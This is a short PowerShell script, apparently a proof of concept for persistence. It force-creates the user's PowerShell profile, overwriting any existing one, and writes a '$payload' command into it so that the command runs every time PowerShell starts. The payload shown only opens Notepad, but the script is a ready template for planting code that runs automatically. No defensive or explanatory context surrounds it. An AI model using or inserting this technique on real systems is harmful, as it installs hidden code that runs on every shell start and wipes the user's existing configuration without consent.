Write-Host -NoNewline [*] New powershell config;
New-Item -Path $profile -Type File –Force;
$path=$profile;
Write-Host [*] config path: $path;
$sets=Test-Path $profile;
if($sets -eq "True"){
    Write-Host [*] New config ok;
    $payload='Start-Process "C:\Windows\System32\notepad.exe"'
    $payload | Out-File -FilePath $path;
    Write-Host [+] write powershell config ok !!!
}else{
    Write-Host -NoNewline [-] New config False...;
    exit(1);
}